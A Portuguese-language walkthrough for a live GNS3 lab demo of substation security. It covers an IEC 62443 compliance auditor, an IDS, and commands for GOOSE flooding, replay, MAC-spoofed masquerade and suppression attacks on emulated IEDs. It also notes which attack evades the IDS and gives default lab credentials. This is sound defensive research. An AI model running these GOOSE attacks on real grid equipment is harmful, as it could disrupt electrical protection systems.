# Roteiro de comandos — demo ao vivo no GNS3

Guia rápido com os comandos prontos pra copiar/colar nos **consoles dos
nós dentro do GNS3** durante a apresentação. Cada container entrega o
terminal direto no console do GNS3 ao iniciar (ver `entrypoint.sh` de
cada imagem) — não precisa SSH manual pra nada além do que o próprio
`oraculo.py` já faz sozinho.

Por que isso não é automatizado num script único: os 4 nós relevantes
(`oraculo-1`, `atacante-1`, `ids-1`, e os `ubuntu-ied-N`) são consoles
**separados e interativos** dentro do GNS3 — não há um orquestrador
externo rodando tudo de uma vez. A rotina abaixo é literalmente "abra
estas N janelas de console e rode isto em cada uma", na ordem certa.
Automatizar isso precisaria de acesso programático aos consoles de nó
do GNS3 (ex. telnet para a porta de console de cada nó) — não vale o
esforço para uma demo ao vivo de poucos minutos, mas fica registrado
como possível item do 4º/5º Marco se quiserem apresentar de forma
100% automática depois (ver `README.md` deste changelog).

## Antes da apresentação

1. Abrir o projeto no GNS3 (`.gns3` gerado por
   `extracao-scd/gerar_topologia_gns3.py`, ou a topologia montada
   manualmente).
2. Dar **Start** em todos os nós: `Switch-Central`, `Switch-1..4`,
   `ied-*` (ou `ubuntu-ied-1..5`), `oraculo-1`, `ids-1`, `atacante-1`.
3. Esperar ~10s (os `entrypoint.sh` configuram o IP sozinhos ao subir —
   não precisa fazer nada manual).
4. Abrir o console de cada nó que for usar na demo (clique direito no
   nó → **Console**). Sugestão de janelas abertas lado a lado:
   - console do `ids-1` (fica rodando o tempo todo, mostrando alertas)
   - console do `atacante-1` (dispara os ataques)
   - console do `oraculo-1` (roda a auditoria de conformidade)

IPs fixos de cada nó (definidos nos `entrypoint.sh`, não precisa
configurar nada):

| Nó | IP |
|---|---|
| `ubuntu-ied-1` .. `ubuntu-ied-5` | `192.168.10.11` .. `192.168.10.15` |
| `oraculo-1` | `192.168.10.20` |

## Parte 1 — Oráculo: conformidade IEC 62443-3-3

No console do `oraculo-1`:

```bash
python3 oraculo.py 192.168.10.11
```

- Usuário/senha padrão já embutidos no script (`usuario_IED` /
  `senha123`); só passar se tiver mudado:
  ```bash
  python3 oraculo.py 192.168.10.11 --user usuario_IED --password senha123
  ```
- Repetir trocando o IP (`.11` a `.15`) pra mostrar que os 5 IEDs dão o
  mesmo resultado (achado em si: frota com configuração idêntica — ver
  `docs/metodologia_proposta_gns3.md`, seção 1).
- O relatório imprime os 8 SRs (1.1, 1.3, 1.5, 1.7, 2.1, 3.1, 5.1, 7.1)
  com conforme/não conforme — esse é o print equivalente à Fig. 3 do
  artigo original, só que ampliado.

## Parte 2 — IDS: deixar monitorando

No console do `ids-1`, **antes** de rodar qualquer ataque:

```bash
python3 ids.py --iface eth0
```

(sem `sudo` — os containers já rodam como root, e a imagem nem
instala `sudo`; se digitar `sudo` dá `bash: sudo: command not found`.)

Deixa essa janela visível durante toda a Parte 3 — os alertas aparecem
em tempo real assim que o `atacante-1` dispara cada teste. Para
registrar os alertas em arquivo (opcional, útil se quiser mostrar o
log depois):

```bash
python3 ids.py --iface eth0 --log /tmp/alertas.jsonl
```

`Ctrl+C` encerra de forma limpa (tem handler de sinal — ver
`ids/ids.py`).

## Parte 3 — Ataques GOOSE

No console do `atacante-1`. A imagem já vem com um molde pronto
(`molde.pcap`, pacote GOOSE real de um relé SEL-351) — **não precisa
capturar tráfego ao vivo** antes de atacar.

```bash
# Teste A — Flooding (DoS)
python3 goose_attack.py flood --iface eth0 --template molde.pcap --pps 2000 --duration 15

# Teste B — Replay
python3 goose_attack.py replay --iface eth0 --template molde.pcap --delay 3

# Teste C1 — Masquerade, atacante "sofisticado" (mesmo MAC do IED legítimo)
# -> esse é o único que o ids-1 NÃO detecta (achado central da demo)
python3 goose_attack.py masquerade --iface eth0 --template molde.pcap --occurrence 0

# Teste C2 — Masquerade, atacante "ingênuo" (MAC próprio/forjado)
# -> esse já é detectado (mudança de MAC no mesmo gocbRef)
python3 goose_attack.py masquerade --iface eth0 --template molde.pcap --occurrence 0 --src-mac de:ad:be:ef:00:99

# Teste D — Suppression
python3 goose_attack.py suppress --iface eth0 --template molde.pcap --jump 1000
```

Rodar **C1 antes de C2** na demo ao vivo é o que mais vale a pena
mostrar: o console do `ids-1` fica em silêncio no C1 e dispara alerta
de `masquerade` no C2 — é a evidência ao vivo do achado central dos
testes (detecção por MAC não pega um atacante que também falsifica a
camada 2).

Dica: usar `--dry-run` antes de qualquer um desses comandos pra
validar que o pacote é montado sem enviar nada à rede, se quiser testar
sem afetar a demo:
```bash
python3 goose_attack.py --dry-run flood --iface eth0 --template molde.pcap --pps 2000 --duration 15
```

## Parte 4 — Extração de SCD + geração da topologia (fora do GNS3)

Essa parte roda no terminal do **host** (fora dos consoles do GNS3) —
é o script Python que gera o `.gns3`, não precisa estar dentro de um
nó:

```bash
cd extracao-scd
python3 extrair_scd.py exemplo_subestacao.scd --json dados.json
python3 gerar_topologia_gns3.py dados.json --out subestacao.gns3
```

Mostra o fluxo completo (SCD → JSON → `.gns3`) reproduzindo o
fluxograma do artigo original (Fig. 1).

## Resumo de alertas esperados (o que falar enquanto cada ataque roda)

| Teste | Alerta no `ids-1` |
|---|---|
| A — Flood | `flood_start` ao cruzar ~20 pkts/s, `flood_end` quando para |
| B — Replay | `replay` já no 2º envio do mesmo `(stNum, sqNum)` |
| C1 — Masquerade (MAC igual) | **nenhum alerta** — passa despercebido |
| C2 — Masquerade (MAC forjado) | `masquerade` — "MAC mudou de X para Y" |
| D — Suppression | `suppression` — salto de `stNum` acima do limiar |
